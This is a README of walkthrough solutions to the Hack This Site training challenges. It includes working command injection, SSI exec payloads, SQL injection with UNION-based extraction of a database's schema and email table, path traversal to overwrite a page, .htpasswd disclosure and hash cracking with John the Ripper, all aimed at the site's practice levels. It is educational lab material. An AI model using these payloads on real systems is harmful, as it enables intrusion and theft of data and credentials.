# HackThisSiteSolutions
Solutions to the Hack This Site challenges.

## Solutions
### Basic Challenges
#### Level 1(the idiot test)
Inspect the source code of the form and you should see a comment of the form:

```
<!-- the first few levels are extremely easy: password is {password} -->
```

Simply paste in the given password.


#### Level 2
The hint says the password comparison file hasn't been uploaded, so if there's not password to compare to, simply press submit!


#### Level 3
Looking at the source code we can see that the name of the file being used for the comparison, `password.php`, is given as a hidden input of the form.
We can go to this file and see it is not protected, and read the password: <https://www.hackthissite.org/missions/basic/3/password.php>


#### Level 4
Looking at the source code we can see the "Send password to Sam" button is part of a form with a hidden input with Sam's email, sam@hackthissite.org.
We can simply update this field to our email by manually editing the HTML, or running the following JS in the Command window:

```JavaScript
document.querySelector('input[name="to"]').setAttribute('value', '{your-email}')
```

Note you can only use the email you used to register with HackThisSite.
An email will be sent to your with the password.


#### Level 5
This level can be solved the same as the previous level. Looking into it, it turns out the difference between the two is this level has CORS, so it cannot be solved by making your own local copy of the HTML page.


#### Level 6
Playing with the encryption system, it's pretty quick to see it works by incrementing the ASCII values of each character by its position in the string.
We can determine this by starting entering single characters, then 2 characters and seeing the next one is incremented, and so forth.
We can determine it's ASCII based by inputing `0z`, `0Z`, or `09` and see they increment to `0{`, `0[` and `0:` respectively.
We can invert the encrypted password with 1 line of Python:

```Python
''.join(chr(ord(c)-i) for i,c in enumerate(pw))
```


#### Level 7
This level allows us to inject unix commands by appending to the input the the `cal` command.
The first thing we can do is see what other files are in the directory by injecting the `ls` command like so:

```bash
2000; ls -la
```

which shows us these files:

```
index.php
level7.php
cal.pl
.
..
k1kh31b1n55h.php
```

We can then go to this page, <https://www.hackthissite.org/missions/basic/7/k1kh31b1n55h.php>, and find the password.


#### Level 8
Here we have another chance to use Unix command injection, this time via an unprotected SSI (Server Side Includes), which we are hinted at by the `.shtml` page extension.
We can find a guide to injection on the OWASP site here: <https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection>
Now we see the page we're directed to is <https://www.hackthissite.org/missions/basic/8/tmp/{random}.shtml>, and we are told the password in `/var/www/hackthissite.org/html/missions/basic/8/` so we just need to check one directory higher.
The can just injection:

```SSI
<!--#exec cmd="ls .." -->
```

Which will show the files:

```
au12ha39vc.php index.php level8.php tmp
```

We can finish off by going to <https://www.hackthissite.org/missions/basic/8/au12ha39vc.php> to see the password.


#### Level 9
This level hints that it is very similar to the previous level, and in fact we should use the vulnerability in the previous level's page to solve it.
We need to go back to Level 8 and do a different injection to list the directory of level 9:

```SSI
<!--#exec cmd="ls ../../9" -->
```

Which will show the files:

```
index.php p91e283zc3.php
```

We can finish off by going to <https://www.hackthissite.org/missions/basic/9/p91e283zc3.php> to see the password.


#### Level 10
This level's page doesn't provide much, but the description says we should use Javascript and there is a "more temporary and "hidden" approach to authenticating users".
The final piece to the puzzle is to inspect the request made after submitting to the password form, and we can see in the Cookie field that we have `level10_authorized=no;`
So we can try to override this with JavaScript inb the Console before submitting:

```JavaScript
document.cookie = "level10_authorized=no;"
```

Now submitting any password will work.


#### Level 11
This level is fairly cryptic.
The inital page has a comment saying `<!--We even have our own collection - if you could find it!-->` and also says a random song is the best.
If we refresh the page we will see a different song name. If we Google each of these song's we'll see they are all by Elton John.
So we need to find the site's collection of Elton John song.
Well, as it turns out we can access the `e` directory at <https://www.hackthissite.org/missions/basic/11/e/>, and can contnue forward to <https://www.hackthissite.org/missions/basic/11/e/l/t/o/n/> at which point we see nothing left in the directory.
It's at this point we need the level's hint that it's about Apache.
If we Google "Apache hidden files" we quickly stumble upon `.htaccess` files, and indeed <https://www.hackthissite.org/missions/basic/11/e/l/t/o/n/.htaccess> exists.
It mention a file of the format `DaAnswer.*` and indeed going to  <https://www.hackthissite.org/missions/basic/11/e/l/t/o/n/DaAnswer> or <https://www.hackthissite.org/missions/basic/11/e/l/t/o/n/DaAnswer.txt> gives us the message `The answer is short! Just look a little harder.`
Reading between the lines, the answer is literally `short`.
But where to put it? Well in all the other challenges is was the `index.php`, and indeed <https://www.hackthissite.org/missions/basic/11/index.php> has a password submit form where we can put the answer.


### Realistic Challenges
#### Level 1: Uncle Arnold's Local Band Review
We can see that band we want to promote, Raging Inferno, has the lowest average rating.
Judging from the trail of decimal places, the rating is probably a simple mean of all votes submitted.
The vote box gives us values `1`-`5`, but we can simply change the value of the input to a much larger value to artificially inflate the rating beyong a single vote's weight.
Like so:

```HTML
<option value="6">1</option>
```

The level will actually accept `6` to consider it hacked, but in theory we'd keep trying larger and larger values until we finally have a big enough influence on the result.
Afterwards pressing the "vote!" button will complete the level.

#### Level 2: Chicago American Nazi Party
Looking at the source of the first page, we can see there is a hidden link to an "update" page, this is clearly where we should go to gain access to the site.
We are brought to a login page, and inspecting the source code here shows nothing glaring. Trying typical username/password combinations doesn't work either. So since this is our only point of entry, makes sense to try an injection attack.
Giving a single quote, `'`, to the username field causes a message about an SQL error to appear, so this confirms we're on the right track.
The classic `' OR 1=1 --` indeed solves the level.


#### Level 3: Peace Poetry: HACKED
Looking at the source code, there is a comment saying the old page has been moved to <https://www.hackthissite.org/missions/realistic/3/oldindex.html> so we should go there: perhaps we can re-hack the site in a similar way.
On this page we see there is a place to both read and submit poetry, this is an entry point. <https://www.hackthissite.org/missions/realistic/3/submitpoems.php>
On the page we see a note "Poems will be stored online immediately but will not be listed on the main poetry page until it has a chance to be looked at." This implies a file will be made and stored on the server. Perhaps we can replace the `index.html`.
Using `index.html` as the name doesn't work, but they're proably stored in a subdirectory, so `../index.html` does indeed work!
The last piece is we need to copy the source code of the `oldindex.html` page into the body that is written to the new `index.html`.


#### Level 4: Fischer's Animal Products
The first thing we see on the page is an input form for an email, so this seems like a good place to start trying injection attacks.
However, it seems anything that doesn't match a valid email format is rejected with the message `Error inserting into table "email"!`
While this means the input it sanitized so we can't inject via this vector, it does give us the hint that we have an SQL database.
Going to either of the links given sends us to a products pages, and we notice the difference between them is the URL parameters, perhaps this could be an input vector for injection?

We'll need to URL encode our inputs, but we can first try a simple inejction to get all products:

```SQL
1 OR 1=1
```

<https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20OR%201%3D1>

This works. Now tested other injections, if we have invalid syntax it simply returns a broken page. So we can attempt a UNION attack to extract the database.
We can determine the number of parameters easily enough, by unioning with the `email` table we know exists from earlier. We can also see where in the output page the data ends up.

```SQL
1 OR 1=1 UNION ALL SELECT 1,2,3,4 FROM email
```

We can see the 1 ends up in the image `src` url, the 2 ends up in the product description, and 3 ends up in the product price, not sure about 4`.
From here we can try use the UNION attack to extract information about the database. For a hacking challenge it's a far guess that it's an SQLite instance, and indeed we can extract the database schemat like so:

```SQL
1 OR 1=1 UNION ALL SELECT NULL,sql,NULL,NULL FROM sqlite_master
```

<https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20OR%201%3D1%20UNION%20ALL%20SELECT%20NULL%2Csql%2CNULL%2CNULL%20FROM%20sqlite_master>

Which tells us:

```SQL
CREATE TABLE products (id int(11), text text, price text, category int(11))
CREATE TABLE email (email text)
```

We can finish off easily by dumping the `email` table:

```SQL
1 OR 1=1 UNION ALL SELECT NULL,email,NULL,NULL FROM email
```

<https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20OR%201%3D1%20UNION%20ALL%20SELECT%20NULL%2Cemail%2CNULL%2CNULL%20FROM%20email>

After which we just need to copy the emails, and send them as a DM to the user `SaveTheWhales` after doing so the level will be complete.


#### Level 5: Damn Telemarketers!
The homepage has a link directly to the database login page, <https://www.hackthissite.org/missions/realistic/5/submit.html>.

The news page also contains a hint, <https://www.hackthissite.org/missions/realistic/5/news.htm>.
`9/15/03 - Google was grabbing links it shouldn't be so I have taken extra precautions.`
The standard way to direct Google's webcrawlers is with a `robots.txt`, so we can check it: <https://www.hackthissite.org/missions/realistic/5/robots.txt>.
It shows it doesn't want the webcrawler to check `/lib` and `/secret`.

<https://www.hackthissite.org/missions/realistic/5/lib/> shows there's a `hash` file which is a binary we can download. This must be the hash function used to hash the password.

<https://www.hackthissite.org/missions/realistic/5/secret/> shows an `admin.php` page which is what checks the database login, and `admin.bak.php` has the following message:
`error matching hash d27509ba0765da2a8cce486df4133b99`

So this is the hash our password needs to match. But how does the hashing algorithm work so we can crack it?
We can figure out what it is by extracting the strings from the `hash` binary:

```bash
strings hash
```

amongst the results we see:

```
md4.c
md4driver.c
MD4 time trial. Processing 1 million 64-character blocks...
MD4 test suite results:
```

So it's an MD4 hash, <https://en.wikipedia.org/wiki/MD4>, which is known to be severely compromised and easy to hack.
We can use tools such as [hashcat](https://hashcat.net/hashcat/) or [John the Ripper](https://www.openwall.com/john/) to crack the password now.

Here I'll use John the Ripper.

```bash
echo 'd27509ba0765da2a8cce486df4133b99' > hash-5.txt
john hash-5.txt --format=Raw-MD4
john hash-5.txt --format=Raw-MD4 --show
```

Which should take a few seconds on the cracking step, then show something like:

```
?:c1729

1 password hash cracked, 0 left
```

Meaning that `c1729` is the password.


#### Level 6: ToxiCo Industrial Chemicals
We're given some ciphertext and a php page where we can interact with the encryption algorithm as a black box. Pretty straightforward: we need to reverse engineer the encryption algorithm and then crack it.

Here's how I explored the encryption algorithms and ended up reverse engineering it:

Firstly I started with giving empty inputs and would the result was also empty. Next I tried a single character, which resulted in 3 numbers returned, 2 characters resulted in 6 numbers returned and so, on implying each character was encoded to 3 numbers. I also noticed that re-submitting the same plaintext and password would result in different ciphertext each time: this means there's randomness in the encryption, so we'll need to find something common about the different outputs.
For this I took several samples of plaintext 'a' with password ''. I Figured there must be some mapping from the triplets of numbers to the ascii value of 'a', which is 97. I was going to brute force over all combinations of binary operators between the 3 numbers and their orderings, however I noticed from their binary representations that they were missing the leading digit, so I tried summing them all and it worked.
From there I tried more letters in the plaintext with blank password, and found the pattern continued. Next I had to find the effect of the password. I tried plaintext 'a' with password 'a', which produced a triplet summing to 194: i.e. 97 * 2. From there I quickly found all the ascii values of the password are summed and added onto each character: This means reordering the letters, incrementing one and decrementing another has no effect on the value of the password.

I now had the completed the reverse engineering of the encryption algorithm, and could write a script to decode a ciphertext given a password, and futhermore could brute force the key easily.

By finding the min and max number in the ciphertext (after summing all triplets), we have a range over which we can search for feasible keys. To check a key we decrypt and check the number of alphabetical characters and spaces. The highest scoring text will be the correct plaintext.

Here is the script to do so:

```python
ciphertext = list(map(int,ciphertext.replace('\n','').split('.')))
ciphertext = [sum(ciphertext[i:i+3]) for i in range(0,len(ciphertext),3)]

maxkey = None
maxtext = 0
for key in range(min(ciphertext)-ord('z'), max(ciphertext)):
    textcount = sum(
        ord('a') <= c-key <= ord('z') or 
        ord('A') <= c-key <= ord('Z') or 
        c-key == ord(' ') 
        for c in ciphertext)
    if textcount > maxtext:
        maxtext = textcount
        maxkey = key
print(''.join(chr(c-maxkey) for c in ciphertext))
```

This is also implemented in the Realistic-6.ipynb Jupyter Notebook.

After getting the plaintext, we need to copy it and send it as a DM to the user `ToxiCo_Watch` after doing so the level will be complete.


#### Level 7: What's Right For America
We are asked to gain access to the admin page, which is somewhere on the site. Exploring the site we quickly come across pages using a php script which seems to be reading text files to find images to show.

For example <https://www.hackthissite.org/missions/realistic/7/showimages.php?file=patriot.txt>, and looking at <https://www.hackthissite.org/missions/realistic/7/patriot.txt> gives use a list of the paths to the files shown in the previous page.

We see they all are under the path directory `/images`, and if we go to <https://www.hackthissite.org/missions/realistic/7/images/> we can see a list of files, including all the images, and also and `admin/` subdirectory. However going to <https://www.hackthissite.org/missions/realistic/7/images/admin> asks us for a password.

We might remember from previous challenges how Apache servers hide directories using `.htaccess` files, but what about password protecting them? If we Google Apache protect directory, we'll quickly stumble upon `.htpasswd` files: if we could get the contents we could get the username and password.

Well what about using the `showimages.php` script to read the contents? We can craft our url: <https://www.hackthissite.org/missions/realistic/7/showimages.php?file=images/admin/.htpasswd> and see that each of the broken images rendered on the page's src tag is now filled with a different line from the file. This gives us `administrator:$1$AAODv...$gXPqGkIO3Cu6dnclE/sok1`. Looking at their [documentation](https://httpd.apache.org/docs/2.4/programs/htpasswd.html), the password is hashed, usually using MD5, or SHA1, so we'll need to crack the hash.

If we copy the contents directly into a .txt file we can run John The Ripper on it, which will identify the hash type automatically and crack it:

```bash
echo "administrator:$1$AAODv...$gXPqGkIO3Cu6dnclE/sok1\n" > hash-7.txt
john hash-7.txt
john hash-7.txt --show
```

Which will give a result of something like

```
shadow           (administrator)
```

Meaning the password is `shadow`.

We can now go back to <https://www.hackthissite.org/missions/realistic/7/images/admin>, enter the username and password, and the challenge will be complete.
